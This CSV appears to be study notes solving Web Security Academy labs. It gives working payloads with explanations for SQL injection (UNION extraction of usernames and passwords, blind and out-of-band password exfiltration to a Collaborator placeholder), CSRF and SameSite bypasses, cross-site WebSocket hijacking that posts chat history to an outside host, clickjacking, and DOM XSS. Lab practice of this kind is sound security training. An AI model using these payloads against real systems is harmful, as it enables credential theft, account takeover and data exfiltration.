Number,Description,Command,Comments,Tags
25,SQL injection vulnerability in WHERE clause allowing retrieval of hidden data,'+OR+1=--,"SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Modify the category parameter","Apprentice, SQLi"
26,SQL injection vulnerability allowing login bypass,administrator'--,"In the username, random characters in password field as the ‘— is commenting out the rest of the SQL query, so it doesn’t matter what this is as the DB will not run this section of the query","Apprentice, SQLi"
27,"SQL injection UNION attack, determining the number of columns returned by the query","'+UNION+SELECT+NULL,NULL,NULL--","Results from the SQL query are returned in the response, so you can use a UNION attack. The first step is to determine the number of columns being returned.
'+UNION+SELECT+NULL-- returns an error, you keep adding NULL until you don’t get an error.","Practitioner, SQLi"
28,"SQL injection UNION attack, finding a column containing text","'+UNION+SELECT+NULL,'PdyFAM',NULL--",The next step is to identify a column that is compatible with string data. Add random string characters sequentially until one of the columns doesn’t result in an error. Make sure to include single quotes in the string being added.,"Practitioner, SQLi"
29,"SQL injection UNION attack, retrieving data from other tables","'+UNION+SELECT+username,+password+FROM+users--","You can now use this column to extract data from other tables in the DB.
'+UNION+SELECT+'abc','def'-- shows 200 OK, so both columns can accept strings. First column is therefore extracting the USERNAME, and the second column is extracting the PASSWORD, both from the USERS table.","Practitioner, SQLi"
30,"SQL injection UNION attack, retrieving multiple values in a single column","'+UNION+SELECT+NULL,username||'~'||password+FROM+users--","Use ||'~'|| to concatenate the information, this allows multiple values in the same column. Think of it like username AND password together in the same column. Note that not all SQL languages have the same syntax, some will use other ways to perform the same action.","Practitioner, SQLi"
31,"SQL injection attack, querying the database type and version on Oracle","'+UNION+SELECT+BANNER,+NULL+FROM+v$version--'+UNION+SELECT+version,NULL+FROM+v$instance--","Using a UNION attack. Each DB type has a different way to call version. In Oracle, every SELECT needs to come FROM a table. The built in table is called ‘dual’. '+UNION+SELECT+NULL,NULL+FROM+dual--
This is the base command to identify two columns in Oracle. '+UNION+SELECT+'abc','def'+FROM+dual--","Practitioner, SQLi"
32,"SQL injection attack, querying the database type and version on MySQL and Microsoft","'UNION+SELECT+@@version,NULL#","'UNION+SELECT+NULL,NULL# Commenting when using MySQL.
'UNION+SELECT+'abc','def'#
","Practitioner, SQLi"
33,"SQL injection attack, listing the database contents on non-Oracle databases","'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zoudta'--
","Database contents section in SQL cheatsheet.
First, find out all the table names:
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
Then, find out all the column names from the table that has user information. In this case, users_zoudta.
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zoudta'--
Finally, get the username and password information.
'+UNION+SELECT+username_unlnrh,password_mcxvgq+FROM+users_zoudta--
This is using the same sort of double column format, and is simple once the enum has been done on the database to identify the table and columns that info should be extracted from.","Practitioner, SQLi"
34,"SQL injection attack, listing the database contents on Oracle","'UNION+SELECT+table_name,NULL+FROM+all_tables--

'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OHUMHM'--

'+UNION+SELECT+USERNAME_VORBBT,+PASSWORD_LJNRHS+FROM+USERS_OHUMHM--","Remember that Oracle SELECT statements must have a FROM and the default table ‘dual’ can be used.
Listing the tables:
'UNION+SELECT+table_name,NULL+FROM+all_table--
Getting the columns from the interesting table identified:
'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OHUMHM'--
Getting the user and pass from the columns within the username table:
'+UNION+SELECT+USERNAME_VORBBT,+PASSWORD_LJNRHS+FROM+USERS_OHUMHM--","Practitioner, SQLi"
35,Blind SQL injection with conditional responses,"Identify ‘users’ table:
' AND (SELECT 'a' FROM users LIMIT 1)='a

Identify username ‘administrator’:
' AND (SELECT 'a' FROM users WHERE username='administrator')='a

Identify number of characters in password (sequentially up from 1 until false):
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

Identify first character of password using Intruder (payload at the final ‘a’ character):
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Identify second character of password using Intruder (payload in same position):
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a","TrackingId=hmrLj6LL5ucS27Cr' AND '1'='1. This returns the “Welcome Back!” message but TrackingId=hmrLj6LL5ucS27Cr' AND '1'='2 does not. Indicates how you can infer the result.
' AND (SELECT 'a' FROM users LIMIT 1)='a. This will infer that the table ‘users’ exists.
' AND (SELECT 'a' FROM users WHERE username='administrator')='a. This infers that the username ‘administrator’ exists.
Then, sequentially identify how many characters are in the password.
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a. Change the number until it returns false. The last ‘true’ statement is at >19, so there are 20 characters in the password.
Then use Intruder to determine each character of the password.
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
Add the intruder position at the final ‘a’ character, as this will get Intruder to iterate through this character. Grep-Match ‘Welcome Back’ to identify the character that is correct for the first character of the password. Then, re-run the attack so that it tests for the second character.
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a","Practitioner, SQLi"
36,Blind SQL injection with conditional errors,"TrackingId=fGxw1PL5NKoujlMP'||(SELECT '' FROM dual)||’ vs TrackingId=fGxw1PL5NKoujlMP'||(SELECT '' FROM blah)||’
These give different error messages when there is a syntax error.

Identify users table existence:
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

Identify administrator existence (using CASE 1=1 for true):
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Identify the number of characters in the password (iterate up from >1 until you get an error):
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Identify the first character of the password (set the payload to ‘a’):

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

","TrackingId=xyz' vs TrackingId=xyz''. These will show error 500 vs 200 OK. You can infer that the error 500 is therefore a syntax error, while 200 OK is accepted.
Confirm it is a SQL error:
'||(SELECT '')||' This is invalid due to database type, '||(SELECT '' FROM dual)||' is valid (Oracle as all SELECT statements need to be FROM  a table).

Then, perform the steps to identify the users table and the administrator user. The CASE function can be used to make something true.

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Perform the steps to identify the character in the first character of the password. Set the payload to ‘a’:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Re-run the intruder attack, with 2,1 instead:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
","Practitioner, SQLi"
37,Blind SQL injection with time delays,TrackingId=x'||pg_sleep(10)--,"This will cause a 10 second delay, the SQLi cheat sheet has more options, such as:
SELECT SLEEP(10)
WAITFOR DELAY '0:0:10'
","Practitioner, SQLi"
38,Blind SQL injection with time delays and information retrieval,"Initial SQLi to get a delay:
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Verify that the username ‘administrator’ exsists from the table ‘users’:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+USERS--

Determine length of password (change the 1 until it is true):
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Determine first character of password, use Intruder and iterate up:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--","When the application doesn’t respond any differently, you can use time delays as a conditional trigger to determine the output.

TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Use 1=1 or 1=2 to determine that a boolean trigger can be used to trigger the time delay. This condition can then be replaces e.g. username=’administrator’.

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+USERS--

For this, set the process thread to a single thread. Go to the ""Resource pool"" tab and add the attack to a resource pool with the ""Maximum concurrent requests"" set to 1
To see the time taken for response in the Intruder output, go to the ""Columns"" menu, and check the box for ""Response received"".
","Practitioner, SQLi"
39,Blind SQL injection with out-of-band interaction,"TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d""1.0""+encoding%3d""UTF-8""%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//BURP-COLLABORATOR-SUBDOMAIN/"">+%25remote%3b]>'),'/l')+FROM+dual--","Combines SQLi with XXE techniques for out of band interaction.
Remember to replace the collaborator domain.","Practitioner, SQLi"
40,Blind SQL injection with out-of-band data exfiltration,"TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d""1.0""+encoding%3d""UTF-8""%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"">+%25remote%3b]>'),'/l')+FROM+dual--","Combines the above OOB payload with another SQL query SELECT+password+FROM+users+WHERE+username%3d'administrator'
Note the concatenation to include both  statements in the one query.
Remember to replace the collaborator domain.","Practitioner, SQLi"
41,SQL injection with filter bypass via XML encoding,<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>,"Convert/obfuscate payload using XML entities.Highlight input and right-click > Extensions > Hackvertor > Encode > dec_entities/hex_entities.
","Practitioner, SQLi"
42,CSRF vulnerability with no defenses,"<form method=""POST"" action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""email"" value=""anything%40web-security-academy.net"">
</form>
<script>
        document.forms[0].submit();
</script>","Right-click on the request, select Engagement Tools > Generate CSRF PoC.

Make sure the option to include an auto-submit script is enabled.","Apprentice, CSRF"
43,CSRF where token validation depends on request method,"<form action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""email"" value=""anything%40web-security-academy.net"">
</form>
<script>
        document.forms[0].submit();
</script>","Changing the value of the csrf parameter rejects the request.

Change the request type from POST to GET, and note that the csrf token is no longer verified. Note that this should be done by right clicking the request and selecting “Change request type”. Request will then look like:

GET /my-account/change-email?email=kento%http://40kentosec.com/&csrf=jRN4RSu27T7l2qEflkfXzkq7lj0ymX8i HTTP/1.1

Rather than having the parameters in the body, it is added to the URL.","CSRF, Practitioner"
44,CSRF where token validation depends on token being present,"<form method=""POST"" action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""$param1name"" value=""$param1value"">
</form>
<script>
    document.forms[0].submit();
</script>",Simply delete the csrf parameter entirely and note that this is now accepted.,"CSRF, Practitioner"
45,CSRF where token is not tied to user session,,"The CSRF token is not tied to a specific account, so you can generate one from an account you have access to and then use this in the CSRF attack.

Note that the CSRF token shouldn’t be used, so drop the request when you are generating one for use in the CSRF PoC.","CSRF, Practitioner"
46,CSRF where token is tied to non-session cookie,"/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None

<img src=""https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"" onerror=""document.forms[0].submit()"">","The Search function reflects the input into a cookie.

Set-Cookie: LastSearchTerm=test; Secure; HttpOnly

/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None

Consider URL encoding here, the above will work if put directly in the URL but not in the search box. %0d%0a is a new line/line break which is required to set a new cookie. So this won’t work in the search box but will work in the URL directly if URL encoded.

In the auto-submit section of the CSRF PoC, make sure the search function is first performed so that the cookie is set, and then the form is submitted. This will ensure the Cookie value and the CSRF token are matching.","CSRF, Practitioner"
47,CSRF where token is duplicated in cookie,"/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None

<img src=""https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"" onerror=""document.forms[0].submit();""/>","Bypassing the insecure ‘double submit’ CSRF prevention technique.

The CSRF parameter is being validated against the CSRF cookie.

Set the cookie using the Search function, then create a CSRF PoC that has a CSRF key the same as what the cookie was set to.

In the auto-submit section of the CSRF PoC, make sure the search function is first performed so that the cookie is set, and then the form is submitted. This will ensure the Cookie value and the CSRF token are matching.","CSRF, Practitioner"
48,SameSite Lax bypass via method override,"Change method via Burp, and add &_method=POST.

GET /my-account/change-email?email=kento@kentosec.com&_method=POST

<script>
    document.location = ""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"";
</script>","No CSRF specific implementations, the /login request doesn’t specify SameSite flag, so the default Lax is used. This means the cookie will be sent in cross-site GET requests, as long as they involve a top-level navigation.

Changing the request method is blocked, but can be bypassed by adding &_method=POST to the end of the URL.","CSRF, Practitioner"
49,SameSite Strict bypass via client-side redirect,"In exploit server:

<script>
    document.location = ""https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"";
</script>

Generate a CSRF PoC on changing email, make sure the GET method is used by changing the request method. Change the postId parameter in your exploit server to include the full GET request for changing email address.

<script>
    document.location = ""https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"";
</script>","SameSite=Strict explicitly set when a cookie is issued. This prevents the browser from sending a cookie in cross-site requests.

There is a redirect function when posting a comment./post/comment/confirmation?postId=x using the imported JavaScript file /resources/js/commentConfirmationRedirect.js

You can use path traversal so that the redirect URL will point to the account page.

/post/comment/confirmation?postId=1/../../my-account. you can use the postId
parameter to elicit a GETrequest for an arbitrary endpoint on the target site.

needs to include the submit parameter and URL encode the ampersand delimeter to avoid breaking out of the postId parameter in the initial setup request. (%40).","CSRF, Practitioner, Review"
50,SameSite Strict bypass via sibling domain,"<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send(""READY"");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

URL encode the script, and use this in a reflected XSS attack. Deliver to victim.

<script>
    document.location = ""https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"";
</script>","Cross-site WebSocket hijacking. Exfiltrate the victims chat history.

Sibling domain at cms-labid disclosed in the Access-Control-Allow-Origin header.

Use reflected XSS attack to launch the CSWSH attack without being mitigated by SameSite restrictions. When delivered to a victim, this will cause the Cookie to be sent to the CSWSH attack and obtain the full chat history.","CSRF, Practitioner, Review"
,,,,
51,SameSite Lax bypass via cookie refresh,"<form method=""POST"" action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""email"" value=""pwned@portswigger.net"">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>","Uses OAuth flow: GET /oauth-callback?code=[...] does not specify any SameSite restrictions, so the cookie will set Lax as the default.

The application will start the Oauth login flow after 2 minutes of inactivity. Browsing to /social-login will start this OAuth flow.

The attack starts by forcing the victim’s browser to visit /social-login to get a valid cookie, then submits the email change request after a short pause.

To bypass the popup blocker, the exploit needs to open once the user has clicked.","CSRF, Practitioner"
52,CSRF where Referer validation depends on header being present,"<meta name=""referrer"" content=""no-referrer"">",Delete the Referer header entirely. Include the HTML to suprress the Referer header,"CSRF, Practitioner"
53,CSRF with broken Referer validation,"history.pushState("""", """", ""/?YOUR-LAB-ID.web-security-academy.net"")

Referrer-Policy: unsafe-url","Website accepts any Referer header as long as it contains the expected domain somewhere in the string.

The HTML will cause the Referer header in the generated request to contain the URL of the target site in the query string.

Add the second HTML in the Head section. Note the spelling.","CSRF, Practitioner"
54,Basic clickjacking with CSRF token protection,"<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src=""YOUR-LAB-ID.web-security-academy.net/my-account""></iframe>","Substitute the values with appropriate sizes.

height: 700px
width: 500px
top: 300px
side: 60px
opacity: 0.1 or 0.0001 for attack.

adjust the size to match up with the ‘delete account’ button

","Apprentice, Clickjacking"
55,Clickjacking with form input data prefilled from a URL parameter,"<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src=""YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com""></iframe>","/my-account?email=hacker@attacker-website.com

This will pre-fill the text box, then the clickjacking attack will update the email address accordingly. Again, make sure to line up the “click me” box appropriately.

top: 400px
side: 80px","Apprentice, Clickjacking"
56,Clickjacking with a frame buster script,"<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox=""allow-forms""
src=""YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com""></iframe>","sandbox=”allow-forms”

This neutralizes the framebuster script","Apprentice, Clickjacking"
57,Exploiting clickjacking vulnerability to trigger DOM-based XSS,"<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src=""YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult""></iframe>",This calls the print function on the victims browser,"Clickjacking, Practitioner"
58,Multistep clickjacking,"<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class=""firstClick"">Test me first</div>
<div class=""secondClick"">Test me next</div>
<iframe src=""YOUR-LAB-ID.web-security-academy.net/my-account""></iframe>","Multi-step, where there are two elements that will appear after each other. This is to bypass a confirmation dialogue that appears after a user first clicks on the ‘delete account’ button.","Clickjacking, Practitioner"
59,DOM XSS using web messages,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/"" onload=""this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"">","Home page contains an addEventListener() call that listens for a web message.

Deliver exploit to victim. When the iframe loads, the postMessage() method sends a web message to the home page. This is then taken and inserted into the div with the id ads, so it takes the img tag which causes an error, the onerror handler executes the payload.","DOM-Based, Practitioner"
60,DOM XSS using web messages and a JavaScript URL,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/"" onload=""this.contentWindow.postMessage('javascript:print()//http:','*')"">


 <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>","Home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings “http:” or “https:”

Payload sends a web message containing an arbitrary JavaScript payload to the main page. Event listener spots the “http:” string and sends the payload to the location.href sink, where the print() function is called.","DOM-Based, Practitioner"
